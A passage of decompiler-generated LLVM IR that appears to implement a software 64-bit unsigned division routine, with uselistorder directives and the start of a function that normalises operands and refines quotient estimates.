  %v4_17c68102 = phi i32 [ %v5_17c60, %bb188 ], [ %v1_17b6c, %dec_label_pc_17c5c ]
  %v1_17b7841 = phi i32 [ %v6_17c64, %bb188 ], [ %v2_17b68, %dec_label_pc_17c5c ]
  %v4_17c68.v1_17b6c = select i1 %tmp206, i32 %v4_17c68102, i32 %v1_17b6c
  br label %dec_label_pc_17b78

dec_label_pc_17c70:                               ; preds = %dec_label_pc_17984
  %tmp207 = icmp ugt i32 %v2_17968, %v2_17984
  br i1 %tmp207, label %bb189, label %dec_label_pc_17990

bb189:                                            ; preds = %dec_label_pc_17c70
  %v5_17c74 = add i32 %v1_17968, -2
  %v6_17c78 = add i32 %v2_17984, %v1_17984
  br label %dec_label_pc_17990

dec_label_pc_17c80:                               ; preds = %dec_label_pc_1793c
  %tmp208 = icmp ugt i32 %v2_17924, %v2_1793c
  br i1 %tmp208, label %bb190, label %dec_label_pc_17948

bb190:                                            ; preds = %dec_label_pc_17c80
  %v5_17c84 = add i32 %v0_17908, -2
  store i32 %v5_17c84, i32* %fp.global-to-local, align 4
  %v6_17c88 = add i32 %v2_1793c, %v0_1791c
  br label %dec_label_pc_17948

; uselistorder directives
  uselistorder i1 %tmp206, { 1, 0 }
  uselistorder i32 %v5_17c54, { 1, 0 }
  uselistorder i32 %v1_1776c54, { 1, 0 }
  uselistorder i1 %v9_17c34, { 1, 0 }
  uselistorder i1 %v9_17c0c, { 1, 0 }
  uselistorder i32 %v7_17c0c, { 1, 0 }
  uselistorder i32 %v2_17bec, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17be0, { 1, 0 }
  uselistorder i32 %v3_17bd0, { 2, 1, 0 }
  uselistorder i32 %v0_17bd0, { 1, 0 }
  uselistorder i32 %v3_17bcc, { 2, 1, 0 }
  uselistorder i32 %v5_17bc8, { 3, 1, 0, 2 }
  uselistorder i32 %v2_17bb4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17ba8, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17b98, { 0, 2, 1 }
  uselistorder i32 %v0_17b84, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_17b7c, { 1, 0, 2 }
  uselistorder i32 %v1_17b6c, { 1, 0, 2 }
  uselistorder i32 %v2_17b68, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_17b5c, { 1, 0 }
  uselistorder i32 %v0_17b5c, { 1, 0 }
  uselistorder i32 %v5_17b54, { 1, 2, 0, 3 }
  uselistorder i32 %v3_17b44, { 1, 0 }
  uselistorder i32 %v0_17b3c, { 1, 2, 0 }
  uselistorder i32 %v0_17b28, { 1, 3, 2, 0 }
  uselistorder i32 %v3_17b18, { 1, 0, 3, 2 }
  uselistorder i32 %v0_17af8, { 1, 0 }
  uselistorder i32 %v6_17aec, { 1, 0 }
  uselistorder i1 %v2_17ad8, { 1, 0 }
  uselistorder i1 %v7_17ad4, { 1, 2, 0 }
  uselistorder i1 %v7_17abc, { 1, 0 }
  uselistorder i32 %v1_17aa4, { 1, 0 }
  uselistorder i32 %v0_1771c86, { 1, 0 }
  uselistorder i32 %v0_1772089, { 1, 0 }
  uselistorder i32 %v6_17a90, { 1, 0 }
  uselistorder i32 %v0_1772085, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1771c84, { 0, 2, 1 }
  uselistorder i1 %v3_17a74, { 1, 0 }
  uselistorder i32 %v0_17a6c, { 1, 0 }
  uselistorder i32 %v6_17a60, { 1, 0 }
  uselistorder i1 %v2_17a4c, { 1, 0 }
  uselistorder i1 %v9_17a48, { 1, 2, 0 }
  uselistorder i32 %v5_17a10, { 2, 1, 0 }
  uselistorder i32 %v1_17a04, { 2, 1, 3, 0 }
  uselistorder i32 %v2_179cc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_179c0, { 2, 3, 1, 0 }
  uselistorder i32 %v2_179b8, { 2, 0, 1 }
  uselistorder i32 %v0_179a4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17984, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17978, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17968, { 0, 2, 1 }
  uselistorder i32 %v1_17968, { 2, 1, 3, 0 }
  uselistorder i32 %v2_1793c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17930, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17924, { 0, 2, 1 }
  uselistorder i32 %v3_17920, { 1, 0 }
  uselistorder i32 %v0_1791c, { 1, 2, 0 }
  uselistorder i32 %v0_17908, { 1, 0, 2, 3 }
  uselistorder i32 %v3_178f8, { 1, 0 }
  uselistorder i32 %v4_178d8, { 1, 0 }
  uselistorder i32 %v2_178d0, { 1, 0, 2 }
  uselistorder i32 %v6_178c4, { 1, 0 }
  uselistorder i1 %v9_178a4, { 1, 0 }
  uselistorder i32 %v0_178e8, { 9, 8, 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v5_17814, { 2, 1, 0 }
  uselistorder i32 %v1_17808, { 2, 1, 3, 0 }
  uselistorder i32 %v0_177ec, { 1, 0, 2 }
  uselistorder i32 %v2_177d0, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_177c4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_177bc, { 2, 0, 1 }
  uselistorder i32 %v3_177b8, { 1, 0 }
  uselistorder i32 %v0_177b4, { 1, 2, 0 }
  uselistorder i32 %v0_177a0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17790, { 1, 0 }
  uselistorder i32 %v3_1779024, { 1, 0 }
  uselistorder i32 %v6_17778, { 1, 0 }
  uselistorder i32 %v0_1777c, { 1, 0 }
  uselistorder i1 %v7_17758, { 1, 0 }
  uselistorder i32 %v0_17740, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_17780, { 6, 7, 5, 1, 2, 3, 4, 0, 8 }
  uselistorder i32 %v0_17888, { 5, 6, 12, 11, 2, 9, 3, 1, 4, 7, 8, 10, 0, 13 }
  uselistorder i32 %v0_1777c60, { 1, 0 }
  uselistorder i32 %v1_17a74, { 5, 6, 2, 12, 11, 4, 7, 3, 8, 9, 10, 0, 1, 13 }
  uselistorder i32 %v0_1772090, { 1, 0 }
  uselistorder i32 %v0_17720, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1771c, { 1, 0, 2 }
  uselistorder i32 %v0_17704, { 1, 2, 0, 3 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 10, 8, 9, 11 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 0, 5, 6, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 15, 5, 6, 3, 4, 7, 14, 11, 12, 8, 13, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 9, 10, 3, 4, 5, 6, 11, 12, 7, 13 }
  uselistorder i32* %fp.global-to-local, { 0, 2, 3, 1, 4, 5, 7, 6, 8, 9 }
  uselistorder i32 65535, { 96, 97, 98, 99, 0, 1, 13, 12, 14, 4, 5, 24, 47, 25, 48, 26, 49, 15, 16, 6, 27, 50, 28, 51, 52, 17, 53, 7, 29, 54, 30, 55, 31, 56, 57, 58, 32, 59, 60, 61, 18, 62, 8, 63, 64, 65, 66, 33, 67, 34, 68, 69, 19, 70, 9, 71, 72, 35, 73, 36, 74, 37, 75, 38, 76, 20, 10, 77, 78, 11, 39, 79, 40, 80, 81, 82, 21, 83, 84, 2, 41, 85, 42, 86, 43, 87, 88, 89, 22, 90, 91, 3, 44, 92, 45, 93, 46, 94, 23, 95 }
  uselistorder label %.thread104, { 1, 0 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %bb183, { 1, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_17c24, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb176, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_17bc0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17b00, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %bb165, { 1, 0 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %.thread98, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_17a74, { 1, 0 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %bb145, { 3, 2, 1, 0 }
  uselistorder label %.thread96, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1799c, { 1, 0 }
  uselistorder label %dec_label_pc_17990, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17948, { 2, 1, 3, 0 }
  uselistorder label %bb141, { 1, 0, 3, 2 }
  uselistorder label %bb139, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %bb135, { 1, 0 }
  uselistorder label %dec_label_pc_17898, { 1, 0 }
  uselistorder label %dec_label_pc_17874, { 1, 0 }
  uselistorder label %dec_label_pc_17854, { 2, 1, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_1784c, { 2, 0, 1 }
  uselistorder label %bb132, { 3, 2, 1, 0 }
  uselistorder label %.thread95, { 3, 1, 2, 0 }
  uselistorder label %bb129, { 1, 0 }
  uselistorder label %bb126, { 0, 1, 3, 2 }
  uselistorder label %.thread94, { 1, 0 }
  uselistorder label %bb123, { 1, 0 }
  uselistorder label %dec_label_pc_17734, { 2, 0, 1 }
}

define i32 @function_17c98() local_unnamed_addr {
dec_label_pc_17c98:
  %fp.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v12_17c98 = load i32, i32* @r7, align 4
  %v27_17c98 = load i32, i32* @lr, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_17cac = load i32, i32* @r3, align 4
  %v2_17cac = icmp eq i32 %v0_17cac, 0
  store i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32* @r4, align 4
  %v0_17cb4 = load i32, i32* @r1, align 4
  store i32 %v0_17cb4, i32* %r6.global-to-local, align 4
  %v0_17cbc = load i32, i32* @r2, align 4
  store i32 %v0_17cbc, i32* @r5, align 4
  %v0_17cc0 = load i32, i32* @r0, align 4
  store i32 %v0_17cc0, i32* %sb.global-to-local, align 4
  br i1 %v2_17cac, label %dec_label_pc_17cc8, label %dec_label_pc_17dc4

dec_label_pc_17cc8:                               ; preds = %dec_label_pc_17c98
  %tmp = icmp ugt i32 %v0_17cbc, %v0_17cb4
  br i1 %tmp, label %dec_label_pc_17cd0, label %dec_label_pc_17e38

dec_label_pc_17cd0:                               ; preds = %dec_label_pc_17cc8
  %v3_17cd4 = icmp ult i32 %v0_17cbc, 65534
  br i1 %v3_17cd4, label %dec_label_pc_18168, label %dec_label_pc_17cd8

dec_label_pc_17cd8:                               ; preds = %dec_label_pc_17cd0
  %v3_17cdc = icmp ugt i32 %v0_17cbc, 16777214
  %v9_17cdc = icmp eq i32 %v0_17cbc, 16777215
  %v2_17ce0 = xor i1 %v9_17cdc, true
  %v3_17ce0 = and i1 %v3_17cdc, %v2_17ce0
  br i1 %v3_17ce0, label %bb, label %bb86

bb:                                               ; preds = %dec_label_pc_17cd8
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_17cd8, %bb
  %v1_17cf035 = phi i32 [ 16777215, %dec_label_pc_17cd8 ], [ 24, %bb ]
  %v2_17ce4 = xor i1 %v3_17cdc, true
  %v3_17ce4 = or i1 %v9_17cdc, %v2_17ce4
  br i1 %v3_17ce4, label %bb87, label %bb88

bb87:                                             ; preds = %bb86
  br label %bb88

bb88:                                             ; preds = %bb86, %bb87
  %v1_17cf034 = phi i32 [ %v1_17cf035, %bb86 ], [ 16, %bb87 ]
  br i1 %v3_17ce0, label %bb89, label %bb90

bb89:                                             ; preds = %bb88
  store i32 8, i32* @ip, align 4
  br label %bb90

bb90:                                             ; preds = %bb88, %bb89
  br i1 %v3_17ce4, label %bb91, label %bb92

bb91:                                             ; preds = %bb90
  store i32 16, i32* @ip, align 4
  br label %bb92

bb92:                                             ; preds = %bb147, %.thread62, %bb90, %bb91
  %v1_17cf0 = phi i32 [ 8, %bb147 ], [ 0, %.thread62 ], [ %v1_17cf034, %bb90 ], [ %v1_17cf034, %bb91 ]
  %v6_17cf0 = lshr i32 %v0_17cbc, %v1_17cf0
  %v4_17cf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 36) to i32*), align 4
  %v2_17cfc = add i32 %v4_17cf8, %v6_17cf0
  %v3_17cfc = inttoptr i32 %v2_17cfc to i8*
  %v4_17cfc = load i8, i8* %v3_17cfc, align 1
  %v6_17cfc = zext i8 %v4_17cfc to i32
  %v0_17d00 = load i32, i32* @ip, align 4
  %v2_17d00 = sub i32 %v0_17d00, %v6_17cfc
  %v9_17d00 = icmp eq i32 %v0_17d00, %v6_17cfc
  br i1 %v9_17d00, label %.critedge, label %.thread2

.thread2:                                         ; preds = %bb92
  %v7_17d04 = shl i32 %v0_17cb4, %v2_17d00
  %v2_17d08 = sub i32 32, %v2_17d00
  %v7_17d0c = shl i32 %v0_17cbc, %v2_17d00
  store i32 %v7_17d0c, i32* @r5, align 4
  %v8_17d10 = lshr i32 %v0_17cc0, %v2_17d08
  %v9_17d10 = or i32 %v8_17d10, %v7_17d04
  store i32 %v9_17d10, i32* %r6.global-to-local, align 4
  %v3_17d14 = udiv i32 %v7_17d0c, 65536
  store i32 %v3_17d14, i32* %r8.global-to-local, align 4
  store i32 %v3_17d14, i32* @r1, align 4
  store i32 %v9_17d10, i32* @r0, align 4
  %v7_17d20 = shl i32 %v0_17cc0, %v2_17d00
  store i32 %v7_17d20, i32* %sb.global-to-local, align 4
  br label %bb94

.critedge:                                        ; preds = %bb92
  %v3_17d14.c = udiv i32 %v0_17cbc, 65536
  store i32 %v3_17d14.c, i32* %r8.global-to-local, align 4
  store i32 %v3_17d14.c, i32* @r1, align 4
  store i32 %v0_17cb4, i32* @r0, align 4
  br label %bb94

bb94:                                             ; preds = %.critedge, %.thread2
  %v0_17d24 = call i32 @function_12920()
  %v0_17d28 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17d24, i32* %sl.global-to-local, align 4
  %v0_17d30 = load i32, i32* %r6.global-to-local, align 4
  %v2_17d34 = call i32 @function_12a1c(i32 %v0_17d30, i32 %v0_17d28)
  %v0_17d38 = load i32, i32* @r5, align 4
  %v3_17d3c = urem i32 %v0_17d38, 65536
  store i32 %v3_17d3c, i32* @r7, align 4
  %v2_17d40 = mul i32 %v0_17d24, %v3_17d3c
  %v0_17d44 = load i32, i32* %sb.global-to-local, align 4
  %v3_17d44 = udiv i32 %v0_17d44, 65536
  %v4_17d48 = mul i32 %v0_17d28, 65536
  %v5_17d48 = or i32 %v3_17d44, %v4_17d48
  %tmp152 = icmp ugt i32 %v2_17d40, %v5_17d48
  br i1 %tmp152, label %dec_label_pc_17d54, label %.thread57

dec_label_pc_17d54:                               ; preds = %bb94
  %v2_17d54 = add i32 %v5_17d48, %v0_17d38
  %v3_17d54 = icmp ult i32 %v2_17d54, %v5_17d48
  %v1_17d58 = add i32 %v0_17d24, -1
  store i32 %v1_17d58, i32* %sl.global-to-local, align 4
  br i1 %v3_17d54, label %.thread57, label %dec_label_pc_17d60

dec_label_pc_17d60:                               ; preds = %dec_label_pc_17d54
  %tmp153 = icmp ugt i32 %v2_17d40, %v2_17d54
  br i1 %tmp153, label %bb95, label %.thread57

bb95:                                             ; preds = %dec_label_pc_17d60
  %v5_17d64 = add i32 %v0_17d24, -2
  store i32 %v5_17d64, i32* %sl.global-to-local, align 4
  %v6_17d68 = add i32 %v2_17d54, %v0_17d38
  br label %.thread57

.thread57:                                        ; preds = %bb94, %dec_label_pc_17d60, %dec_label_pc_17d54, %bb95
  %v1_17d6c = phi i32 [ %v2_17d54, %dec_label_pc_17d54 ], [ %v5_17d48, %bb94 ], [ %v6_17d68, %bb95 ], [ %v2_17d54, %dec_label_pc_17d60 ]
  %v2_17d6c = sub i32 %v1_17d6c, %v2_17d40
  store i32 %v2_17d6c, i32* @r4, align 4
  %v0_17d70 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17d70, i32* @r1, align 4
  store i32 %v2_17d6c, i32* @r0, align 4
  %v0_17d78 = call i32 @function_12920()
  store i32 %v0_17d78, i32* %r6.global-to-local, align 4
  %v0_17d84 = load i32, i32* @r4, align 4
  %v2_17d88 = call i32 @function_12a1c(i32 %v0_17d84, i32 %v0_17d70)
  %v0_17d8c = load i32, i32* @r7, align 4
  %v2_17d8c = mul i32 %v0_17d78, %v0_17d8c
  %v0_17d90 = load i32, i32* %sb.global-to-local, align 4
  %v3_17d94 = urem i32 %v0_17d90, 65536
  %v4_17d98 = mul i32 %v0_17d70, 65536
  %v5_17d98 = or i32 %v3_17d94, %v4_17d98
  %tmp154 = icmp ugt i32 %v2_17d8c, %v5_17d98
  br i1 %tmp154, label %dec_label_pc_17da4, label %bb97

dec_label_pc_17da4:                               ; preds = %.thread57
  %v1_17da4 = load i32, i32* @r5, align 4
  %v2_17da4 = add i32 %v1_17da4, %v5_17d98
  %v3_17da4 = icmp ult i32 %v2_17da4, %v5_17d98
  %v1_17da8 = add i32 %v0_17d78, -1
  store i32 %v1_17da8, i32* %r6.global-to-local, align 4
  br i1 %v3_17da4, label %bb97, label %dec_label_pc_17db0

dec_label_pc_17db0:                               ; preds = %dec_label_pc_17da4
  %tmp155 = icmp ugt i32 %v2_17d8c, %v2_17da4
  br i1 %tmp155, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_17db0
  %v5_17db4 = add i32 %v0_17d78, -2
  store i32 %v5_17db4, i32* %r6.global-to-local, align 4
  br label %bb97

bb97:                                             ; preds = %.thread57, %dec_label_pc_17da4, %dec_label_pc_17db0, %bb96
  %v0_17db8 = phi i32 [ %v1_17da8, %dec_label_pc_17da4 ], [ %v0_17d78, %.thread57 ], [ %v1_17da8, %dec_label_pc_17db0 ], [ %v5_17db4, %bb96 ]
  %v1_17db8 = load i32, i32* %sl.global-to-local, align 4
  %v4_17db8 = mul i32 %v1_17db8, 65536
  %v5_17db8 = or i32 %v4_17db8, %v0_17db8
  br label %dec_label_pc_17e24

dec_label_pc_17dc4:                               ; preds = %dec_label_pc_17c98
  %v3_17dc4 = icmp uge i32 %v0_17cac, %v0_17cb4
  %v9_17dc4 = icmp eq i32 %v0_17cb4, %v0_17cac
  %v2_17dcc = xor i1 %v9_17dc4, true
  %v3_17dcc = and i1 %v3_17dc4, %v2_17dcc
  br i1 %v3_17dcc, label %dec_label_pc_17e1c, label %dec_label_pc_17dd0

dec_label_pc_17dd0:                               ; preds = %dec_label_pc_17dc4
  %v3_17dd4 = icmp ult i32 %v0_17cac, 65534
  br i1 %v3_17dd4, label %dec_label_pc_17ff4, label %dec_label_pc_17dd8

dec_label_pc_17dd8:                               ; preds = %dec_label_pc_17dd0
  %v3_17ddc = icmp ugt i32 %v0_17cac, 16777214
  %v9_17ddc = icmp eq i32 %v0_17cac, 16777215
  %v2_17de0 = xor i1 %v9_17ddc, true
  %v3_17de0 = and i1 %v3_17ddc, %v2_17de0
  br i1 %v3_17de0, label %bb99, label %bb100

bb99:                                             ; preds = %dec_label_pc_17dd8
  br label %bb100

bb100:                                            ; preds = %dec_label_pc_17dd8, %bb99
  %v1_17de812 = phi i32 [ 16777215, %dec_label_pc_17dd8 ], [ 24, %bb99 ]
  %v2_17de4 = xor i1 %v3_17ddc, true
  %v3_17de4 = or i1 %v9_17ddc, %v2_17de4
  br i1 %v3_17de4, label %bb101, label %bb102

bb101:                                            ; preds = %bb100
  br label %bb102

bb102:                                            ; preds = %bb100, %bb101
  %v1_17de8 = phi i32 [ %v1_17de812, %bb100 ], [ 16, %bb101 ]
  %v2_17de8 = add nsw i32 %v1_17de8, -1
  %v3_17de8 = shl i32 1, %v2_17de8
  %v4_17de8 = and i32 %v3_17de8, %v0_17cac
  %v5_17de8 = icmp ne i32 %v4_17de8, 0
  %v6_17de8 = lshr i32 %v0_17cac, %v1_17de8
  %v4_17df0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 36) to i32*), align 4
  %v2_17df4 = add i32 %v4_17df0, %v6_17de8
  %v3_17df4 = inttoptr i32 %v2_17df4 to i8*
  %v4_17df4 = load i8, i8* %v3_17df4, align 1
  %v6_17df4 = zext i8 %v4_17df4 to i32
  %v3_17df8 = and i1 %v5_17de8, %v2_17de0
  br i1 %v3_17df8, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  store i32 8, i32* @lr, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v0_17e0014 = phi i32 [ %v27_17c98, %bb102 ], [ 8, %bb103 ]
  %v2_17dfc = xor i1 %v5_17de8, true
  %v3_17dfc = or i1 %v9_17ddc, %v2_17dfc
  br i1 %v3_17dfc, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  store i32 16, i32* @lr, align 4
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v0_17e00 = phi i32 [ %v0_17e0014, %bb104 ], [ 16, %bb105 ]
  %v2_17e00 = sub i32 %v0_17e00, %v6_17df4
  store i32 %v2_17e00, i32* %fp.global-to-local, align 4
  %v9_17e00 = icmp eq i32 %v0_17e00, %v6_17df4
  br i1 %v9_17e00, label %dec_label_pc_17e08, label %dec_label_pc_18020

dec_label_pc_17e08:                               ; preds = %bb106, %bb130
  %v1_17e10 = phi i32 [ %v2_17e00, %bb106 ], [ %v2_18018, %bb130 ]
  %v3_17e08 = icmp uge i32 %v0_17cb4, %v0_17cac
  %v2_17e0c = xor i1 %v3_17e08, true
  %v3_17e0c = or i1 %v9_17dc4, %v2_17e0c
  br i1 %v3_17e0c, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_17e08
  %v7_17e0c = icmp ult i32 %v0_17cc0, %v0_17cbc
  br i1 %v7_17e0c, label %dec_label_pc_17e1c, label %.thread3

bb109:                                            ; preds = %dec_label_pc_17e08
  br i1 %v3_17e08, label %.thread3, label %dec_label_pc_17e1c

.thread3:                                         ; preds = %bb108, %bb109
  br label %dec_label_pc_17e24

dec_label_pc_17e1c:                               ; preds = %bb108, %bb109, %dec_label_pc_17dc4
  br label %dec_label_pc_17e24

dec_label_pc_17e24:                               ; preds = %.thread3, %bb139, %dec_label_pc_18144, %bb122, %bb97, %dec_label_pc_17e1c
  %v5_17e24 = phi i32 [ 0, %bb139 ], [ %v1_17e10, %.thread3 ], [ 0, %dec_label_pc_18144 ], [ %v0_17fec, %bb122 ], [ 0, %bb97 ], [ 0, %dec_label_pc_17e1c ]
  %v2_17e24 = phi i32 [ %v5_180e8, %bb139 ], [ 1, %.thread3 ], [ %v1_18144, %dec_label_pc_18144 ], [ %v5_17fe8, %bb122 ], [ %v5_17db8, %bb97 ], [ 0, %dec_label_pc_17e1c ]
  store i32 %v5_17e24, i32* @r1, align 4
  store i32 %v12_17c98, i32* @r7, align 4
  ret i32 %v2_17e24

dec_label_pc_17e38:                               ; preds = %dec_label_pc_17cc8
  %v2_17e38 = icmp eq i32 %v0_17cbc, 0
  br i1 %v2_17e38, label %dec_label_pc_17e40, label %dec_label_pc_17e50

dec_label_pc_17e40:                               ; preds = %dec_label_pc_17e38
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r0, align 4
  %v0_17e48 = call i32 @function_12920()
  store i32 %v0_17e48, i32* @r5, align 4
  br label %dec_label_pc_17e50

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e38, %dec_label_pc_17e40
  %v0_17ea0 = phi i32 [ %v0_17cbc, %dec_label_pc_17e38 ], [ %v0_17e48, %dec_label_pc_17e40 ]
  %v3_17e54 = icmp ult i32 %v0_17ea0, 65534
  br i1 %v3_17e54, label %dec_label_pc_18150, label %dec_label_pc_17e58

dec_label_pc_17e58:                               ; preds = %dec_label_pc_17e50
  %v3_17e5c = icmp ugt i32 %v0_17ea0, 16777214
  %v9_17e5c = icmp eq i32 %v0_17ea0, 16777215
  %v2_17e60 = xor i1 %v9_17e5c, true
  %v3_17e60 = and i1 %v3_17e5c, %v2_17e60
  br i1 %v3_17e60, label %bb111, label %bb112

bb111:                                            ; preds = %dec_label_pc_17e58
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_17e58, %bb111
  %v1_17e7044 = phi i32 [ 16777215, %dec_label_pc_17e58 ], [ 24, %bb111 ]
  %v2_17e64 = xor i1 %v3_17e5c, true
  %v3_17e64 = or i1 %v9_17e5c, %v2_17e64
  br i1 %v3_17e64, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_17e7043 = phi i32 [ %v1_17e7044, %bb112 ], [ 16, %bb113 ]
  br i1 %v3_17e60, label %bb115, label %bb116

bb115:                                            ; preds = %bb114
  store i32 8, i32* @ip, align 4
  br label %bb116

bb116:                                            ; preds = %bb114, %bb115
  br i1 %v3_17e64, label %bb117, label %bb118

bb117:                                            ; preds = %bb116
  store i32 16, i32* @ip, align 4
  br label %bb118

bb118:                                            ; preds = %._crit_edge, %bb143, %bb116, %bb117
  %v1_17e70 = phi i32 [ %v1_17e70.pre, %._crit_edge ], [ 8, %bb143 ], [ %v1_17e7043, %bb116 ], [ %v1_17e7043, %bb117 ]
  %v6_17e70 = lshr i32 %v0_17ea0, %v1_17e70
  %v0_17e78 = load i32, i32* @r4, align 4
  %v2_17e78 = add i32 %v0_17e78, 36
  %v3_17e78 = inttoptr i32 %v2_17e78 to i32*
  %v4_17e78 = load i32, i32* %v3_17e78, align 4
  %v2_17e7c = add i32 %v4_17e78, %v6_17e70
  %v3_17e7c = inttoptr i32 %v2_17e7c to i8*
  %v4_17e7c = load i8, i8* %v3_17e7c, align 1
  %v6_17e7c = zext i8 %v4_17e7c to i32
  %v0_17e80 = load i32, i32* @ip, align 4
  %v2_17e80 = sub i32 %v0_17e80, %v6_17e7c
  store i32 %v2_17e80, i32* %sl.global-to-local, align 4
  %v9_17e80 = icmp eq i32 %v0_17e80, %v6_17e7c
  %v2_17e88 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v9_17e80, label %.thread8, label %dec_label_pc_17e9c

.thread8:                                         ; preds = %bb118
  %v3_17e88 = sub i32 %v2_17e88, %v0_17ea0
  store i32 %v3_17e88, i32* @r4, align 4
  %v4_17e8c = urem i32 %v0_17ea0, 65536
  store i32 %v4_17e8c, i32* %r8.global-to-local, align 4
  %v4_17e90 = udiv i32 %v0_17ea0, 65536
  store i32 %v4_17e90, i32* @r7, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17f54

dec_label_pc_17e9c:                               ; preds = %bb118
  %v6_17e9c = shl i32 %v2_17e88, %v2_17e80
  %v6_17ea0 = shl i32 %v0_17ea0, %v2_17e80
  store i32 %v6_17ea0, i32* @r5, align 4
  %v1_17ea4 = sub i32 32, %v2_17e80
  %v6_17ea8 = lshr i32 %v2_17e88, %v1_17ea4
  store i32 %v6_17ea8, i32* @r4, align 4
  %v1_17eac = load i32, i32* %sb.global-to-local, align 4
  %v7_17eac = lshr i32 %v1_17eac, %v1_17ea4
  %v8_17eac = or i32 %v7_17eac, %v6_17e9c
  %v3_17eb0 = udiv i32 %v6_17ea0, 65536
  store i32 %v3_17eb0, i32* @r7, align 4
  store i32 %v3_17eb0, i32* @r1, align 4
  store i32 %v6_17ea8, i32* @r0, align 4
  %v0_17ec0 = call i32 @function_12920()
  %v0_17ec4 = load i32, i32* @r7, align 4
  store i32 %v0_17ec0, i32* %fp.global-to-local, align 4
  %v0_17ecc = load i32, i32* @r4, align 4
  %v2_17ed0 = call i32 @function_12a1c(i32 %v0_17ecc, i32 %v0_17ec4)
  %v0_17ed4 = load i32, i32* @r5, align 4
  %v3_17ed8 = urem i32 %v0_17ed4, 65536
  store i32 %v3_17ed8, i32* %r8.global-to-local, align 4
  %v2_17edc = mul i32 %v0_17ec0, %v3_17ed8
  %v3_17ee4 = udiv i32 %v8_17eac, 65536
  %v4_17ee8 = mul i32 %v0_17ec4, 65536
  %v5_17ee8 = or i32 %v4_17ee8, %v3_17ee4
  %tmp156 = icmp ugt i32 %v2_17edc, %v5_17ee8
  br i1 %tmp156, label %dec_label_pc_17ef4, label %dec_label_pc_17f00

dec_label_pc_17ef4:                               ; preds = %dec_label_pc_17e9c
  %v2_17ef4 = add i32 %v0_17ed4, %v5_17ee8
  %v3_17ef4 = icmp ult i32 %v2_17ef4, %v5_17ee8
  %v1_17ef8 = add i32 %v0_17ec0, -1
  store i32 %v1_17ef8, i32* %fp.global-to-local, align 4
  br i1 %v3_17ef4, label %dec_label_pc_17f00, label %dec_label_pc_181b4

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17e9c, %dec_label_pc_181b4, %bb151, %dec_label_pc_17ef4
  %v1_17f00 = phi i32 [ %v6_181bc, %bb151 ], [ %v2_17ef4, %dec_label_pc_17ef4 ], [ %v5_17ee8, %dec_label_pc_17e9c ], [ %v2_17ef4, %dec_label_pc_181b4 ]
  %v2_17f00 = sub i32 %v1_17f00, %v2_17edc
  store i32 %v2_17f00, i32* @r4, align 4
  %v0_17f04 = load i32, i32* @r7, align 4
  store i32 %v0_17f04, i32* @r1, align 4
  store i32 %v2_17f00, i32* @r0, align 4
